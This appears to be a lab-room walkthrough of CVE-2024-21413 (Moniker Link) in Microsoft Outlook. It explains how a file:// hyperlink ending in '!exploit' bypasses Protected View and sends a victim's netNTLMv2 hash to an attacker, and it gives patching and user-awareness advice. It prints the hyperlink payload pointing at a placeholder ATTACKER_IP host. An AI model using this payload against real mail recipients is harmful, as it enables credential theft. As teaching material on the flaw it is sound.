# Moniker Link (CVE-2024-21413)
![image](https://github.com/user-attachments/assets/e5cc39df-8999-4bb7-bb1a-69917a70e094)
## Intro
On February 13th, 2024, Microsoft announced a Microsoft Outlook RCE & credential leak vulnerability with the assigned CVE of CVE-2024-21413 (Moniker Link). Haifei Li of Check Point Research is credited with discovering the vulnerability.

The vulnerability bypasses Outlook's security mechanisms when handing a specific type of hyperlink known as a Moniker Link. An attacker can abuse this by sending an email that contains a malicious Moniker Link to a victim, resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.

Details relating to the scoring of the vulnerability have been provided in the table below:

## Moniker Link (CVE-2024-21413)
Outlook can render emails as HTML. You may notice this being used by your favourite newsletters. Additionally, Outlook can parse hyperlinks such as HTTP and HTTPS. However, it can also open URLs specifying applications known as Moniker Links. Normally, Outlook will prompt a security warning when external applications are triggered.

Outlooks Protected View is triggered when launching an external application

This pop-up is a result of Outlook's "Protected View". Protected View opens emails containing attachments, hyperlinks and similar content in read-only mode, blocking things such as macros (especially from outside an organisation). 

By using the file:// Moniker Link in our hyperlink, we can instruct Outlook to attempt to access a file, such as a file on a network share (<a href="file://ATTACKER_IP/test">Click me</a>). The SMB protocol is used, which involves using local credentials for authentication. However, Outlook's "Protected View" catches and blocks this attempt.

<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>

The vulnerability here exists by modifying our hyperlink to include the ! special character and some text in our Moniker Link which results in bypassing Outlook’s Protected View. For example: <a href="file://ATTACKER_IP/test!exploit">Click me</a>.

<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

We, as attackers, can provide a Moniker Link of this nature for the attack. Note the share does not need to exist on the remote device, as an authentication attempt will be attempted regardless, leading to the victim's Windows netNTLMv2 hash being sent to the attacker.

Remote Code Execution (RCE) is possible because Moniker Links uses the Component Object Model (COM) on Windows. However, explaining this is currently out of scope for this room, as there is no publicly released proof of concept for achieving RCE via this specific CVE.

The PoC:

    Takes an attacker & victim email. Normally, you would need to use your own SMTP server (this has already been provided for you in this room)
    Requires the password to authenticate. For this room, the password for attacker@monikerlink.thm is attacker
    Contains the email content (html_content), which contains our Moniker Link as a HTML hyperlink
    Then, fill in the "subject", "from" and "to" fields in the email
    Finally, it sends the email to the mail server

 - Wireshark
   - Additionally, the SMB request from the victim to the client can be seen in a packet capture with a truncated netNTLMv2 hash.

## Remediation

Microsoft has included patches to resolve this vulnerability in February’s “patch Tuesday” release. You can see a list of KB articles by Office build here. Updating Office through Windows Update or the Microsoft Update Catalog is strongly recommended.

Additionally, in the meantime, it is a timely reminder to practice general - safe - cyber security practices. For example, reminding users to:

    Do not click random links (especially from unsolicited emails)
    Preview links before clicking them
    Forward suspicious emails to the respective department responsible for cyber security

Since this vulnerability bypasses Outlook's Protected View, there is no way to reconfigure Outlook to prevent this attack. Additionally, preventing the SMB protocol entirely may do more harm than good, especially as it is essential for accessing network shares. However, you may be able to block this at the firewall level, depending on the organisation.

## FIN

Congrats! That was fun. As we know, Outlook is an extremely popular email client. The CVE is known to affect a large portion of the Office suite, and given its extremely low attack complexity, it's quite a spicy one.

Remember, it is essential to update Outlook through Windows Update or the Microsoft Update Catalog as soon as possible, as there is no way to prevent Outlook's "Protected View" from being bypassed.

I hope you enjoyed the room!
